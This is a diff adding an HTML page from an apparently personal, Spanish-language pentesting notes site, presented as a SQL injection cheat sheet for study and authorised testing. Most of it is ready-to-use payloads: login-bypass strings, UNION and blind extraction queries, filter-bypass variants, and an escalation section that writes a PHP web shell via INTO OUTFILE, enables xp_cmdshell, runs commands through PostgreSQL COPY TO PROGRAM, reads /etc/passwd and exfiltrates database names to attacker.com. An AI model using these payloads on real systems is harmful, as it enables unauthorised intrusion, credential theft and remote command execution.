@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Web Fuzzing - AD Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <!-- NAVBAR -->
+    <nav>
+        <a href="index.html">Home</a>
+
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#">Privesc ▾</a>
+            <div class="dropdown-content">
+                <a href="windows_privesc.html">Windows PrivEsc</a>
+                <a href="linux-privesc.html">Linux Privesc</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#">Web ▾</a>
+
+            <div class="dropdown-content">
+
+                <div class="dropdown-sub">
+                    <a href="#">Finger Printing ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="directoryBruteForce.html">Directory Brute Force</a>
+                    </div>
+                </div>
+
+                 <div class="dropdown-sub">
+                    <a href="#">Attacks ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="directoryTraversal.html">Directory Travresal</a>
+                        <a href="fileInclusions.html">File Inclusions</a>
+                        <a href="fileUpload.html">File Uploads</a>
+                        <a href="osCommand.html">OS Command Injections</a>
+                        <a href="sqli.html">SQL Injections</a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+        <a href="pivoting.html">Pivoting</a>
+    </nav>
+     <div class="search-bar">
+        <input type="text" id="global-search" placeholder="Buscar..." />
+        <button onclick="performSearch()">🔍 Search</button>
+        <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
+        <div id="search-results" class="search-results collapsed"></div>
+    </div>
+    <!-- CONTENT -->
+ <div class="container">
+
+    <!-- CONCEPTOS -->
+    <div class="section">
+        <div class="section-header">Conceptos Básicos</div>
+        <div class="section-content">
+
+            <p><strong>SQL Injection (SQLi)</strong>: Vulnerabilidad que permite manipular consultas SQL mediante entradas de usuario no sanitizadas.</p>
+
+            <p><strong>Ejemplo de consulta SQL:</strong></p>
+            <pre><code>SELECT * FROM users WHERE user_name='leon';</code></pre>
+
+            <p><strong>Ejemplo vulnerable en backend (PHP):</strong></p>
+            <pre><code>$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";</code></pre>
+
+        </div>
+    </div>
+
+    <!-- TIPOS -->
+    <div class="section">
+        <div class="section-header">Tipos de SQL Injection</div>
+        <div class="section-content">
+
+            <!-- ERROR BASED -->
+            <h3>Error-based SQLi</h3>
+            <p>Provoca errores para obtener información de la base de datos.</p>
+
+            <pre><code>' OR 1=1 --</code></pre>
+
+            <p>Se usa para bypass de autenticación o forzar errores visibles.</p>
+
+            <!-- UNION BASED -->
+            <h3>UNION-based SQLi</h3>
+            <p>Permite combinar resultados de múltiples consultas.</p>
+
+            <p>Enumeración de columnas:</p>
+            <pre><code>' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--</code></pre>
+
+            <p>Ejemplo de extracción de datos:</p>
+            <pre><code>' UNION SELECT null, database(), user(), @@version --</code></pre>
+
+            <p>Enumeración de tablas y columnas:</p>
+            <pre><code>' UNION SELECT null, table_name, column_name, table_schema 
+FROM information_schema.columns 
+WHERE table_schema=database() --</code></pre>
+
+            <!-- BLIND SQLi -->
+            <h3>Blind SQL Injection</h3>
+
+            <p><strong>Boolean-based:</strong></p>
+            <pre><code>' AND 1=1 --
+' AND 1=2 --</code></pre>
+
+            <pre><code>' AND IF(SUBSTRING(user(),1,1)='a',1,0) --</code></pre>
+
+            <p><strong>Time-based:</strong></p>
+            <pre><code>' AND IF(1=1, SLEEP(5), 0) --</code></pre>
+
+        </div>
+    </div>
+
+    <!-- PAYLOADS -->
+    <div class="section">
+        <div class="section-header">Plantillas Comunes para Probar SQLi</div>
+        <div class="section-content">
+
+            <h3>Bypass básico</h3>
+            <pre><code>' OR 1=1 --
+" OR 1=1 --
+') OR 1=1 --
+' OR 1=1;--
+' OR 1=1 #
+' OR 1=1 /*</code></pre>
+
+            <h3>Comparaciones alternativas</h3>
+            <pre><code>' OR '1'='1
+" OR "1"="1
+' AND 1=2 --</code></pre>
+
+            <h3>Payloads con delay</h3>
+            <pre><code>' OR SLEEP(5) --
+' AND SLEEP(5) --</code></pre>
+
+        </div>
+    </div>
+
+    <!-- FILTROS -->
+    <div class="section">
+        <div class="section-header">Bypass de Filtros</div>
+        <div class="section-content">
+
+            <h3>Variaciones comunes</h3>
+            <pre><code>' OR 1=1 -- -
+' OR 1=1#
+' OR '1'='1'--</code></pre>
+
+            <h3>Uso de comentarios</h3>
+            <pre><code>-- 
+#
+/* */</code></pre>
+
+            <h3>Bypass de espacios</h3>
+            <pre><code>'/**/OR/**/1=1--</code></pre>
+
+            <h3>Encoding</h3>
+            <pre><code>%27 OR 1=1 --</code></pre>
+
+        </div>
+    </div>
+
+    <!-- UNION -->
+    <div class="section">
+        <div class="section-header">UNION Injection</div>
+        <div class="section-content">
+
+            <h3>Requisitos</h3>
+            <ul>
+                <li>Mismo número de columnas</li>
+                <li>Tipos de datos compatibles</li>
+            </ul>
+
+            <h3>Payload base</h3>
+            <pre><code>' UNION SELECT null,null,null --</code></pre>
+
+            <h3>Enumeración del sistema</h3>
+            <pre><code>' UNION SELECT null, database(), user(), @@version --</code></pre>
+
+            <h3>Enumeración de tablas</h3>
+            <pre><code>' UNION SELECT null, table_name, column_name 
+FROM information_schema.columns 
+WHERE table_schema=database() --</code></pre>
+
+            <h3>Ejemplo extracción usuarios</h3>
+            <pre><code>' UNION SELECT null, username, password FROM users --</code></pre>
+
+        </div>
+    </div>
+
+    <!-- BLIND -->
+    <div class="section">
+        <div class="section-header">Blind SQL Injection</div>
+        <div class="section-content">
+
+            <h3>Boolean-based</h3>
+            <pre><code>' AND 1=1 --
+' AND 1=2 --</code></pre>
+
+            <h3>Extracción por carácter</h3>
+            <pre><code>' AND SUBSTRING(user(),1,1)='a' --</code></pre>
+
+            <h3>Time-based</h3>
+            <pre><code>' AND IF(SUBSTRING(user(),1,1)='a', SLEEP(5), 0) --</code></pre>
+
+        </div>
+    </div>
+
+    <!-- ENUMERACIÓN -->
+    <div class="section">
+        <div class="section-header">Enumeración útil</div>
+        <div class="section-content">
+
+            <h3>Base de datos</h3>
+            <pre><code>database()</code></pre>
+
+            <h3>Usuario actual</h3>
+            <pre><code>user()</code></pre>
+
+            <h3>Versión</h3>
+            <pre><code>@@version</code></pre>
+
+            <h3>Tablas</h3>
+            <pre><code>information_schema.tables</code></pre>
+
+            <h3>Columnas</h3>
+            <pre><code>information_schema.columns</code></pre>
+
+        </div>
+    </div>
+    
+<div class="section">
+    <div class="section-header">SQL Injection → RCE & Advanced Exploitation</div>
+    <div class="section-content">
+
+        <h3>Concepto</h3>
+        <p>En algunos casos, SQL Injection puede escalar a ejecución de comandos en el sistema (RCE), dependiendo de:</p>
+        <ul>
+            <li>Permisos del usuario de base de datos</li>
+            <li>Configuración del DBMS</li>
+            <li>Funciones peligrosas habilitadas</li>
+        </ul>
+
+        <h3>MySQL / MariaDB</h3>
+
+        <p><strong>Lectura de archivos:</strong></p>
+        <pre><code>SELECT LOAD_FILE('/etc/passwd');</code></pre>
+
+        <p><strong>Escritura de web shell:</strong></p>
+        <pre><code>SELECT '<?php system($_GET["cmd"]); ?>' 
+INTO OUTFILE '/var/www/html/shell.php';</code></pre>
+
+        <p><strong>Requisitos:</strong></p>
+        <ul>
+            <li>Permiso FILE</li>
+            <li>Directorio escribible por el proceso MySQL</li>
+        </ul>
+
+        <h3>MSSQL (Microsoft SQL Server)</h3>
+
+        <p><strong>Ejecución de comandos:</strong></p>
+        <pre><code>EXEC xp_cmdshell 'whoami';</code></pre>
+
+        <p><strong>Habilitar xp_cmdshell (si está deshabilitado):</strong></p>
+        <pre><code>EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;</code></pre>
+
+        <h3>PostgreSQL</h3>
+
+        <p><strong>Ejecución de comandos mediante COPY:</strong></p>
+        <pre><code>COPY (SELECT '') TO PROGRAM 'id';</code></pre>
+
+        <p><strong>Lectura de archivos:</strong></p>
+        <pre><code>SELECT pg_read_file('/etc/passwd');</code></pre>
+
+        <h3>Exfiltración de datos (Out-of-Band)</h3>
+
+        <p>Cuando no hay output visible, se pueden usar técnicas OOB:</p>
+
+        <pre><code>SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\share\\', database()));</code></pre>
+
+        <p>También se pueden usar canales DNS o HTTP para filtrar datos indirectamente.</p>
+
+        <h3>Web Shell (concepto)</h3>
+
+        <p>Si se consigue escritura en el servidor web:</p>
+
+        <pre><code><?php system($_GET['cmd']); ?></code></pre>
+
+        <p>Luego se accede vía navegador:</p>
+        <pre><code>http://target/shell.php?cmd=whoami</code></pre>
+
+        <h3>Enumeración previa a RCE</h3>
+
+        <pre><code>SELECT user();
+SELECT database();
+SELECT @@version;</code></pre>
+
+        <h3>Checklist para intentar RCE</h3>
+        <ul>
+            <li>Identificar DBMS (MySQL, MSSQL, PostgreSQL)</li>
+            <li>Verificar privilegios del usuario</li>
+            <li>Comprobar funciones peligrosas habilitadas</li>
+            <li>Intentar lectura de archivos</li>
+            <li>Intentar escritura en filesystem</li>
+            <li>Intentar ejecución de comandos (si aplica)</li>
+        </ul>
+
+    </div>
+</div>
+    <!-- NOTAS -->
+    <div class="section">
+        <div class="section-header">Notas</div>
+        <div class="section-content">
+
+            <ul>
+                <li>Siempre identificar el tipo de SQLi antes de explotar</li>
+                <li>Probar distintos delimitadores y comentarios</li>
+                <li>Determinar número de columnas en UNION</li>
+                <li>Usar blind SQLi cuando no hay output directo</li>
+                <li>Adaptar payloads según el motor (MySQL, MSSQL, PostgreSQL)</li>
+            </ul>
+
+        </div>
+    </div>
+
+</div>
+
+    <!-- SCRIPT -->
+    <script>
+                document.querySelectorAll(".section-header").forEach(h => {
+                        h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+                });
+                function toggleSearchResults() {
+                        const results = document.getElementById("search-results");
+                        const toggleBtn = document.getElementById("toggle-results");
+
+                        results.classList.toggle("collapsed");
+
+                        if (results.classList.contains("collapsed")) {
+                                toggleBtn.textContent = "▼";
+                        } else {
+                                toggleBtn.textContent = "▲";
+                        }
+                }
+
+                function performSearch() {
+                        const query = document.getElementById("global-search").value.toLowerCase();
+                        const resultsContainer = document.getElementById("search-results");
+                        resultsContainer.innerHTML = "";
+
+                        if (!query) {
+                                resultsContainer.classList.add("collapsed");
+                                return;
+                        }
+
+                        const allElements = Array.from(document.body.querySelectorAll("*"))
+                                .filter(el => el.children.length === 0 && el.textContent.toLowerCase().includes(query));
+
+                        if (allElements.length === 0) {
+                                resultsContainer.innerHTML = "<div>No se encontraron resultados</div>";
+                        } else {
+                                allElements.forEach((el, idx) => {
+                                        let container = el.closest(".section, .sub-section") || el;
+
+                                        if (!container.id) {
+                                                container.id = `search-target-${idx}`;
+                                        }
+
+                                        const div = document.createElement("div");
+                                        div.textContent = el.textContent;
+                                        div.style.cursor = "pointer";
+                                        div.style.padding = "5px 10px";
+                                        div.style.borderBottom = "1px solid #1e293b";
+                                        div.onmouseover = () => div.style.backgroundColor = "#1e293b";
+                                        div.onmouseout = () => div.style.backgroundColor = "";
+                                        div.onclick = () => {
+                                                if (container.classList.contains("section") || container.classList.contains("sub-section")) {
+                                                        container.classList.add("active");
+                                                }
+
+                                                container.scrollIntoView({ behavior: "smooth", block: "center" });
+
+                                                container.classList.add("highlight-fade");
+                                                setTimeout(() => container.classList.remove("highlight-fade"), 2000);
+                                        };
+
+                                        resultsContainer.appendChild(div);
+                                });
+                        }
+
+                        resultsContainer.classList.remove("collapsed");
+                }
+        </script>
+
+</body>
+
+</html>
